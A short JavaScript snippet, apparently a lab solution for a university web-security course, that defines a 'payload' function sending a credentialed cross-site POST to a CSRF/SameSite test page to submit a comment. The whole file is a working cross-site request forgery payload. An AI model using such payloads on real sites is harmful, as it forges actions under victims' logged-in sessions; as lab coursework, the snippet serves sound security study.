async function payload() {
  fetch("https://webappsec.cs.ut.ee/csrf/comments_samesite.php",{
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "comment=xss_post",
    credentials: "include"
  })
}
